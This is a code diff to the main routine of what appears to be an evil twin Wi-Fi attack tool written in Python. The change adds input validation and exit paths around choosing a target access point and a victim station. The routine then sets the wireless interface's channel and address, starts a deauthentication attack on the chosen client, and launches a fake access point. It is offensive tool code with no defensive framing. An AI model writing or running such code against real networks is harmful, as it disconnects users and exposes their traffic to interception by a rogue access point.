@@ -110,20 +110,39 @@ if __name__ == "__main__":
             cc.register(twinm, 1)
             ap_collector = apc.APCollector(nicm)
             collect_aps(ap_collector)
-            ap_id = input("Please, select the target AP to start the stations collections: ")
-            if ap_id is not None:
-                collect_stations(ap_collector, ap_id)
-                station_id = input("Please, select the station id to deauthenticate for evil twin attack: ")
-                selected_ap = ap_collector.get_ap_data(int(ap_id))
-                nicm.set_channel(selected_ap[util.CHANNEL][0], util.NIC_MON)
-                ap_mac = selected_ap[util.BSSID]
-                st_mac = selected_ap[util.STATIONS][int(station_id)]
-                nicm.set_address(util.NIC_AP)
-                twinm.build_ap_conf()
-                twinm.start_deauth_attack(ap_mac, st_mac)
-                twinm.start_fake_ap()
-            else:
+            ap_count = ap_collector.aps_count()
+            if ap_count == 0:
+                print("[*] No access point detected! Exit ... ")
+                cc.cleanup_all()
                 sys.exit(1)
+            sel = False
+            while(not sel):
+                ap_id = input("Please, select the target AP to start the stations collections: ")
+                if ap_id is not None and (0 <= int(ap_id) < ap_count):
+                    sel = True
+                else:
+                    print("[*] Bad selection! Please retry with a valid access point id ...")
+            collect_stations(ap_collector, ap_id)
+            station_count = ap_collector.st_count(int(ap_id))
+            if station_count == 0:
+                print("[*] No stations detected for the selected access point! Exit ... ")
+                cc.cleanup_all()
+                sys.exit(1)
+            sel = False
+            while(not sel):
+                station_id = input("Please, select a valid station id to deauthenticate for evil twin attack: ")
+                if 0 <= int(station_id) < station_count:
+                    sel = True
+                else:
+                    print("[*] Bad selection! Please retry with a valid station id ...")
+            selected_ap = ap_collector.get_ap_data(int(ap_id))
+            nicm.set_channel(selected_ap[util.CHANNEL][0], util.NIC_MON)
+            ap_mac = selected_ap[util.BSSID]
+            st_mac = selected_ap[util.STATIONS][int(station_id)]
+            nicm.set_address(util.NIC_AP)
+            twinm.build_ap_conf()
+            twinm.start_deauth_attack(ap_mac, st_mac)
+            twinm.start_fake_ap()
         except Exception:
             cc.cleanup_all()
 
